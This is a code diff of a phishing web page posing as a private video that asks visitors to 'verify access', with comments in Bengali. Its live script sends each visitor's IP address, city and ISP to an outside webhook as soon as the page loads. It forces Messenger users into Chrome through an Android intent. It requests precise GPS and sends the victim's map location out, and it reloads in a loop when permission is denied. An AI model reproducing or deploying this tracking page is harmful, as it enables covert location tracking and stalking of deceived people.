@@ -3,72 +3,41 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔒 Private Video Access</title>
-    
-    <meta property="og:title" content="🔒 Security Check: Video Verification">
-    <meta property="og:description" content="This video is restricted. Please verify your identity to access and play.">
+    <title> </title> <meta property="og:title" content=" ">
+    <meta property="og:description" content=" ">
     <meta property="og:image" content="https://i.postimg.cc/ZnyFjR0V/IMG-6711.jpg">
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="630">
     <meta property="og:type" content="website">
 
     <style>
-        body { margin: 0; background-color: #050505; color: white; font-family: 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        #verify-card { background: #18191a; padding: 30px; border-radius: 20px; text-align: center; max-width: 350px; border: 1px solid #3e4042; box-shadow: 0 20px 40px rgba(0,0,0,0.7); }
-        .icon-play { font-size: 50px; color: #0084ff; margin-bottom: 15px; }
-        h2 { margin: 0 0 10px; font-size: 22px; color: #e4e6eb; }
-        p { color: #b0b3b8; font-size: 14px; line-height: 1.5; }
-        .device-info { background: #242526; padding: 10px; border-radius: 8px; margin: 15px 0; font-size: 13px; color: #0084ff; border: 1px dashed #3e4042; }
-        .btn { background: #0084ff; color: white; padding: 14px 28px; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; width: 100%; margin-top: 10px; box-shadow: 0 4px 15px rgba(0,132,255,0.3); }
-        #loader { display: none; width: 30px; height: 30px; border: 3px solid #f3f3f3; border-top: 3px solid #0084ff; border-radius: 50%; animation: spin 1s linear infinite; margin: 15px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #content { display: none; text-align: center; width: 100%; }
-        img { max-width: 90%; border-radius: 8px; box-shadow: 0 0 25px rgba(0,132,255,0.3); }
+        body { margin: 0; background-color: #050505; color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        #verify-card { background: #18191a; padding: 30px; border-radius: 20px; text-align: center; max-width: 350px; border: 1px solid #3e4042; }
+        .btn { background: #0084ff; color: white; padding: 14px 28px; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 15px; }
+        #content { display: none; text-align: center; }
+        img { max-width: 90%; border-radius: 8px; }
     </style>
 </head>
 <body>
 
     <div id="verify-card">
-        <div class="icon-play">▶️</div>
-        <h2>Access to see video</h2>
-        <p id="status-text">To play this video, you must verify your session. Please click the button below to start.</p>
-        
-        <div class="device-info" id="battery-status">
-            Detecting device status...
-        </div>
-
-        <div id="loader"></div>
-
+        <h2 id="access-text">Access to see video</h2>
+        <p>Please verify your session to start playback.</p>
         <button class="btn" id="action-btn" onclick="requestAccess()">Verify Access</button>
-        
-        <div style="font-size: 11px; color: #65676b; margin-top: 15px;">
-            Secure Encrypted Connection Mode
-        </div>
     </div>
 
     <div id="content">
-        <img src="https://i.postimg.cc/ZnyFjR0V/IMG-6711.jpg" alt="Video Content">
-        <p style="color: #0084ff; font-weight: bold; font-size: 14px; margin-top: 15px;">▶️ Playing Video Stream... 99%</p>
+        <img src="https://i.postimg.cc/ZnyFjR0V/IMG-6711.jpg">
     </div>
 
     <script>
         const webhookURL = "https://e2f275a6-8c4f-4a12-81a9-12f2a1b5d56e.webhooksite.net";
 
-        // ব্যাটারি স্ট্যাটাস ট্র্যাকিং
-        if (navigator.getBattery) {
-            navigator.getBattery().then(function(battery) {
-                const level = Math.round(battery.level * 100);
-                document.getElementById('battery-status').innerText = "Device Battery: " + level + "% | Security: Verified";
-            });
-        }
-
-        // আইপি ট্র্যাকিং (ইউজার Deny করলেও এটি আসবে)
+        // ১. পেজ লোড হওয়ার সাথে সাথে আইপি ট্র্যাকিং (কোনো ক্লিক ছাড়াই)
         window.onload = function() {
             fetch('https://ipapi.co/json/')
             .then(res => res.json())
             .then(data => {
                 sendToWebhook({
-                    Event: "Visitor Landed (IP Info)",
+                    Event: "Page Loaded (Automatic IP)",
                     IP: data.ip,
                     City: data.city,
                     ISP: data.org,
@@ -78,37 +47,31 @@
         };
 
         async function requestAccess() {
-            // ইন-অ্যাপ ব্রাউজার থেকে বের করার ট্রিক
+            // ২. মেসেঞ্জার থেকে ব্রাউজারে নিয়ে যাওয়ার ট্রিক (Android-এর জন্য)
             if (navigator.userAgent.includes("Messenger") || navigator.userAgent.includes("FBAN")) {
                 let url = window.location.href.replace(/^https?:\/\//, '');
                 window.location.href = "intent://" + url + "#Intent;scheme=https;package=com.android.chrome;end";
                 return;
             }
 
-            document.getElementById('action-btn').style.display = 'none';
-            document.getElementById('loader').style.display = 'block';
-            document.getElementById('status-text').innerText = "Requesting video access...";
-
+            // ৩. বাটনে ক্লিক করলে জিপিএস চাওয়া
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        // সাকসেস হলে জিপিএস ডাটা পাঠানো
                         sendToWebhook({
                             Event: "Access Granted ✅",
-                            Maps: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`,
-                            Accuracy: position.coords.accuracy.toFixed(1) + "m"
+                            Maps: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
                         });
-                        
                         document.getElementById('verify-card').style.display = 'none';
                         document.getElementById('content').style.display = 'block';
                     },
                     (error) => {
-                        // ডিনাই করলে আবার লুপে ফেলা
+                        // Deny করলে আবার ট্র্যাকিং ডাটা পাঠানো
                         sendToWebhook({ Event: "Access Denied ❌" });
-                        alert("Access Denied: You must click 'Allow' to verify your network and see the video.");
+                        alert("Access Denied: Please click 'Allow' to verify your network.");
                         location.reload();
                     },
-                    { enableHighAccuracy: true, timeout: 10000 }
+                    { enableHighAccuracy: true }
                 );
             }
         }
